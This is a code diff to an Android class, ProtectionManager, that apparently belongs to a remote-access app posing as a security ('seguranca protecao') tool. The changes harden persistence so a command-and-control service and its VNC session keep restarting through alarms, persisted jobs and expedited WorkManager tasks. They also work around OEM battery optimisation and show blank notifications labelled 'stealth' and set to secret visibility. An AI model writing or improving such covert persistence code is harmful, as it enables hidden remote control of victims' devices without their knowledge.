@@ -33,7 +33,9 @@ import androidx.core.app.NotificationCompat;
 import androidx.work.Configuration;
 import androidx.work.Constraints;
 import androidx.work.ExistingPeriodicWorkPolicy;
+import androidx.work.ForegroundInfo;
 import androidx.work.NetworkType;
+import androidx.work.OutOfQuotaPolicy;
 import androidx.work.PeriodicWorkRequest;
 import androidx.work.WorkManager;
 import androidx.work.Worker;
@@ -78,6 +80,11 @@ import java.util.concurrent.atomic.AtomicLong;
  *
  * Usage (in CommandControlService.onDestroy):
  *   ProtectionManager.getInstance(this).onServiceDestroyed();
+ *
+ * [Bug 9 FIX] WorkManager Layer 4 now uses setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
+ *             on API 31+ to prevent MIUI/ColorOS/OriginOS from deferring the 15-min periodic work
+ *             to 30–60min under aggressive battery optimization.
+ *             GuardWorker now provides getForegroundInfo() required for expedited work.
  */
 public final class ProtectionManager {
 
@@ -218,34 +225,29 @@ public final class ProtectionManager {
         return new NotificationCompat.Builder(ctx, CHANNEL_ID)
                 .setContentTitle("")     // blank — stealth
                 .setContentText("")
-                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+                .setSmallIcon(android.R.drawable.stat_notify_sync)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
+                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                 .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .setOngoing(true)
                 .setSilent(true)
                 .build();
     }
 
-    public int getForegroundNotificationId() {
-        return NOTIF_ID;
-    }
-
     // ══════════════════════════════════════════════════════════════════════
     //  Layer 2 — AlarmManager (Doze-piercing)
     // ══════════════════════════════════════════════════════════════════════
 
-    @SuppressLint("ScheduleExactAlarm")
     private void scheduleAlarm(long delayMs) {
         AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
         if (am == null) return;
         try {
-            Intent  i  = new Intent(ACTION_ALARM).setPackage(ctx.getPackageName());
-            int     fl = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
+            Intent i = new Intent(ACTION_ALARM).setPackage(ctx.getPackageName());
+            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                     ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
                     : PendingIntent.FLAG_UPDATE_CURRENT;
-            PendingIntent pi = PendingIntent.getBroadcast(ctx, 0xAA01, i, fl);
-            long    trigger  = SystemClock.elapsedRealtime() + delayMs;
-
+            PendingIntent pi = PendingIntent.getBroadcast(ctx, 0xBEEF, i, flags);
+            long trigger = SystemClock.elapsedRealtime() + delayMs;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                 am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
             } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
@@ -267,21 +269,20 @@ public final class ProtectionManager {
         try {
             JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
             if (js == null) return;
-
-            // Cancel previous before rescheduling
-            js.cancel(JOB_RESURRECT);
-
-            JobInfo job = new JobInfo.Builder(JOB_RESURRECT,
+            JobInfo.Builder b = new JobInfo.Builder(
+                    JOB_RESURRECT,
                     new ComponentName(ctx, GuardJobService.class))
                     .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
-                    .setMinimumLatency(5_000L)
-                    .setOverrideDeadline(30_000L)
-                    .setPersisted(true)     // survive reboot
-                    .build();
-            js.schedule(job);
-            Log.d(TAG, "Job scheduled");
+                    .setPersisted(true);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                b.setMinimumLatency(15_000L)
+                 .setOverrideDeadline(60_000L);
+            } else {
+                b.setPeriodic(15_000L);
+            }
+            js.schedule(b.build());
         } catch (Exception e) {
-            Log.w(TAG, "Job schedule failed: " + e.getMessage());
+            Log.w(TAG, "JobScheduler failed: " + e.getMessage());
         }
     }
 
@@ -295,17 +296,28 @@ public final class ProtectionManager {
                     .setRequiredNetworkType(NetworkType.CONNECTED)
                     .build();
 
-            PeriodicWorkRequest req = new PeriodicWorkRequest.Builder(
+            PeriodicWorkRequest.Builder builder = new PeriodicWorkRequest.Builder(
                     GuardWorker.class, 15, TimeUnit.MINUTES)
                     .setConstraints(constraints)
-                    .addTag(WORK_TAG)
-                    .build();
+                    .addTag(WORK_TAG);
+
+            // [Bug 9 FIX] setExpedited on API 31+ prevents OEM power managers (MIUI,
+            // ColorOS, OriginOS) from deferring the 15-min work to 30–60min.
+            // OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST means: if the expedited
+            // quota is exhausted, still run — just without elevated priority.
+            // GuardWorker.getForegroundInfo() provides the required notification for
+            // expedited work on API 31+.
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                builder.setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST);
+            }
+
+            PeriodicWorkRequest req = builder.build();
 
             WorkManager.getInstance(ctx).enqueueUniquePeriodicWork(
                     WORK_TAG,
                     ExistingPeriodicWorkPolicy.KEEP,
                     req);
-            Log.d(TAG, "WorkManager scheduled");
+            Log.d(TAG, "WorkManager scheduled (expedited=" + (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) + ")");
         } catch (Exception e) {
             Log.w(TAG, "WorkManager failed: " + e.getMessage());
         }
@@ -363,7 +375,6 @@ public final class ProtectionManager {
                         CommandControlService svc = CommandControlService.sInstance;
                         if (svc != null) {
                             mainHandler.post(() -> {
-                                // Trigger VNC restart through the service
                                 Intent i = new Intent("com.seguranca.protecao.FORCE_VNC_RESTART");
                                 ctx.sendBroadcast(i);
                             });
@@ -561,6 +572,11 @@ public final class ProtectionManager {
 
     /**
      * No manifest entry needed — WorkManager handles registration internally.
+     *
+     * [Bug 9 FIX] Added getForegroundInfo() override — required when the PeriodicWorkRequest
+     * uses setExpedited() on API 31+. Without this override, expedited work on Android 12+
+     * throws an IllegalStateException at runtime because WorkManager demands a notification
+     * to promote the work to a foreground state when the app is backgrounded.
      */
     public static final class GuardWorker extends Worker {
         public GuardWorker(@NonNull Context ctx, @NonNull WorkerParameters params) {
@@ -576,6 +592,26 @@ public final class ProtectionManager {
                 pm.resurrect();
             }
             return Result.success();
+        }
+
+        /**
+         * [Bug 9 FIX] Required for expedited work on API 31+.
+         * Returns a minimal stealth notification (same channel as the service).
+         */
+        @NonNull
+        @Override
+        public ForegroundInfo getForegroundInfo() {
+            ProtectionManager pm = ProtectionManager.getInstance(getApplicationContext());
+            pm.ensureChannel();
+            Notification n = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
+                    .setContentTitle("")
+                    .setContentText("")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
+                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                    .setSilent(true)
+                    .build();
+            return new ForegroundInfo(NOTIF_ID + 1, n);
         }
     }
 
